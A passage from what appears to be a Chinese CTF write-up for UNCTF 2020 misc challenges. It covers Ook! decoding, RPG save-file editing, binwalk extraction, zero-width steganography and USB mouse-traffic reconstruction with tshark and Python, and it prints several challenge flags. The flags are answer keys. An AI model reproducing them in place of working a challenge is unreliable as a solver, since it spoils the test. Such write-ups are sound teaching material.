class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> </span><br><span class="line"><span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook</span>. </span><br><span class="line"><span class="type">Ook</span>. <span class="type">Ook</span>. <span class="type">Ook!</span> <span class="type">Ook</span>. <span class="type">Ook?</span> <span class="type">Ook</span>.</span><br></pre></td></tr></table></figure></div>

<p>解密得到</p>
<p>flag{9_zhe_Jiu_zhe_8_hui_8}</p>
<h4 id="爷的历险记"><a href="#爷的历险记" class="headerlink" title="爷的历险记"></a>爷的历险记</h4><p>题目描述</p>
<blockquote>
<p>RPG小游戏 爷把flag弄丢了, 你可以帮他找回来吗</p>
</blockquote>
<p>下载附件是一个小游戏，真是快乐，出于玩的目的玩了半天</p>
<p>解题</p>
<p>游戏中存在商店，出售hint1,hint2,hint3，经过一番尝试，打过了几个小boss，但札师傅tql，打不过。于是便把目的转移到hint3。</p>
<p>当我们买到hint2时，给我们提示rpgsave：</p>
<p><img src="/images/unctf2020/hint2.png" alt=""></p>
<p>便去搜了一波，找到rpgsave文件的修改方式：</p>
<p><a href="http://web.save-editor.com/tool/rpg_tkool_mv.html" target="_blank" rel="noopener">http://web.save-editor.com/tool/rpg_tkool_mv.html</a></p>
<p><img src="/images/unctf2020/rpgsave.png" alt=""></p>
<p>于是我们选择我们文件的保存路径，将游戏的存档文件进行DECODE：</p>
<p>得到file1.rpgsave.txt，在这个txt文本中我们把金钱修改的大一点然后保存，再将这个txt文本进行上述链接的加密。最后替换掉存档中的file1文件即可。</p>
<p>我们发现，再次继续游戏时：</p>
<p><img src="/images/unctf2020/GG.png" alt=""></p>
<p>之后购买hint3得到flag</p>
<p>flag：UNCTF{WelC0me_70_UNCTF2oZ0~}</p>
<h4 id="躲猫猫"><a href="#躲猫猫" class="headerlink" title="躲猫猫"></a>躲猫猫</h4><p>题目描述</p>
<blockquote>
<p>我躲好了，你来找我</p>
</blockquote>
<p>下载题目附件，是一个xlsx后缀的Excel文件，直接打开的话，并没有任何显示。</p>
<p>根据题目所述，信息是隐藏的，使用binwalk直接进行分离，在分离出的压缩文件中找到</p>
<p><img src="/images/unctf2020/cat.png" alt=""></p>
<p>记事本打开直接搜索flag。</p>
<p>flag：unctf{7383b67de9106a6f10fdbe4e8ebc64ce}</p>
<h4 id="零"><a href="#零" class="headerlink" title="零"></a>零</h4><p>题目描述</p>
<blockquote>
<p>我瞎了看不到flag了</p>
</blockquote>
<p>打开附件</p>
<blockquote>
<p>‌‌‌‌‍﻿‍‍Neyxj dycs‌‌‌‌‍‬﻿‬ oush,ciuyh‌‌‌‌‍‬‌﻿ guheks bzudh ‌‌‌‌‍﻿‍‌msaksdh iygsch lasudl.Xucjd zuxjcy‌‌‌‌‍‬‍‬‌‌‌‌‍﻿‬﻿ ishch is‌‌‌‌‍﻿‌﻿ vusj.I‌‌‌‌‍﻿‬‍ suduy chis the chaie hunsh ‌‌‌‌‍‬‌﻿lin,lisnd ‌‌‌‌‍‬‬‬zsusy oiyub ‌‌‌‌‌﻿‌‬‌‌‌‌‌﻿‍‌muuyn are syenh ling.Jsudbh nec ‌‌‌‌‍‍﻿﻿orci no‌‌‌‌‌﻿‍‬ urna‌‌‌‌‍‬‬‌‌‌‌‌‍﻿‍‬ non‌‌‌‌‍‬‍﻿ ultricise,‌‌‌‌‍‬‬‬conseturen ‌‌‌‌‍‍﻿﻿in yeuseqr eund val‌‌‌‌‌﻿‬‌ will ping,churneo‌‌‌‌‍‬‍﻿ sudyens lzuebhs‌‌‌‌‍‬‍‬ poin‌‌‌‌‍‬‬‬ sudhen‌‌‌‌‍﻿﻿‍ .Yshebsn kash as zjehsn quis nunie lings zlinjen zune,shxuea zjhenbh suebn snchben zlings.</p>
</blockquote>
<p>看到题目，想到这样的字符串解密肯定跟零类字符有关，于是查到了零宽度字符解密</p>
<p>github有相关的解密网站：<a href="http://330k.github.io/misc_tools/unicode_steganography.html" target="_blank" rel="noopener">http://330k.github.io/misc_tools/unicode_steganography.html</a></p>
<p>直接解密即可得到flag。</p>
<p><img src="/images/unctf2020/zero.png" alt=""></p>
<p>flag：unctf{sycj24_6hvgj_8gfj}</p>
<h4 id="mouse-click"><a href="#mouse-click" class="headerlink" title="mouse_click"></a>mouse_click</h4><p>下载题目是一个usb流量包，大致分析一下，知道这是个鼠标流量。</p>
<p><img src="/images/unctf2020/usb.png" alt=""></p>
<p>使用wireshark自带的tshark命令行工具，可以将 leftover capture data单独提取出来</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CSS"><figure class="iseeu highlight /css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">tshark</span> <span class="selector-tag">-r</span> <span class="selector-tag">mouse_click</span><span class="selector-class">.pcapng</span> <span class="selector-tag">-T</span> <span class="selector-tag">fields</span> <span class="selector-tag">-e</span> <span class="selector-tag">usb</span><span class="selector-class">.capdata</span> &gt; <span class="selector-tag">usbdata</span><span class="selector-class">.txt</span></span><br></pre></td></tr></table></figure></div>

<p>我们去掉usbdata.txt里的空行得到形如这样的数据：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00f</span>f0200</span><br><span class="line"><span class="number">00f</span>f0200</span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00f</span>f0100</span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000200</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line"><span class="number">00000100</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></div>

<p>然后我们需要编写脚本将数据包的内容变成一系列点的集合，为了区分左右按键，可以特意对第一个字节的内容作一下判断。相关脚本如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"><span class="comment">#/usr/bin/env python</span></span><br><span class="line"><span class="comment">#author:As1def</span></span><br><span class="line"></span><br><span class="line">nums = []</span><br><span class="line">keys = open(<span class="string">'usbdata.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">result=open(<span class="string">'result.txt'</span>,<span class="string">'w'</span>)</span><br><span class="line">posx = <span class="number">0</span></span><br><span class="line">posy = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> line <span class="keyword">in</span> keys:</span><br><span class="line">  x = int(line[<span class="number">2</span>:<span class="number">4</span>],<span class="number">16</span>)</span><br><span class="line">  y = int(line[<span class="number">5</span>:<span class="number">7</span>],<span class="number">16</span>)</span><br><span class="line">  <span class="keyword">if</span> x &gt; <span class="number">127</span> :</span><br><span class="line">    x -= <span class="number">256</span></span><br><span class="line">  <span class="keyword">if</span> y &gt;<span class="number">115</span> :</span><br><span class="line">    y -=<span class="number">256</span></span><br><span class="line">  posx += x</span><br><span class="line">  posy += y</span><br><span class="line">  btn_flag = int(line[<span class="number">0</span>:<span class="number">2</span>],<span class="number">16</span>) <span class="comment"># 1 for left , 2 for right , 0 for nothing</span></span><br><span class="line">  <span class="keyword">if</span> btn_flag == <span class="number">1</span> : <span class="comment"># 1 代表左键，2代表右键</span></span><br><span class="line">    result.write(str(posx)+<span class="string">' '</span>+str(-posy)+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">keys.close()</span><br><span class="line">result.close()</span><br></pre></td></tr></table></figure></div>

<p>得到result.txt，数据大致为：</p>
